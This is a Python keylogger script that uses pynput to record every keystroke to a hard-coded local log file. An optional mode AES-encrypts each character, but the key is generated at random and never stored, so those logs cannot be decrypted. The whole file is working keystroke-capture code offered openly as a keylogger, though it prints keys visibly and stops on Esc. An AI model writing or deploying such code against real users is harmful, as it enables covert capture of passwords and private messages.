import sys
from pynput.keyboard import Key, Listener
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import base64

class Keylogger:
    def __init__(self, encrypt=False):
        self.count = 0
        self.keys = []
        self.key = get_random_bytes(16)
        self.iv = get_random_bytes(16)
        self.cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        self.encrypt = encrypt
    
    def on_press(self, key):
        self.keys.append(key)
        self.count += 1
        print("{0} pressed".format(key))

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []
    
    def write_file(self, keys):
        with open("c:\\Users\\User\\Desktop\\CODE\\PROJECT\\KEYLOGGER\\Keylogger Scribbled\\dumkey\\dumlog.txt", "ab") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write(b' ')
                elif k.find("enter") > 0:
                    f.write(b'\n')
                elif k.find("backspace") > 0:
                    f.write(b'\b')
                elif k.find("Key") == -1:
                    if self.encrypt:
                        encrypted_data = self.cipher.encrypt(pad(k.encode(), AES.block_size))
                        encoded_data = base64.b64encode(encrypted_data)
                        f.write(encoded_data)
                    else:
                        f.write(k.encode())
    
    def on_release(self, key):
        if key == Key.esc:
            self.stop_keylogger()
            return False
    
    def start_keylogger(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
    
    def stop_keylogger(self):
        pass

encrypt_arg = False
if len(sys.argv) > 1 and sys.argv[1] == "encrypt":
    encrypt_arg = True

keylogger = Keylogger(encrypt_arg)
keylogger.start_keylogger()
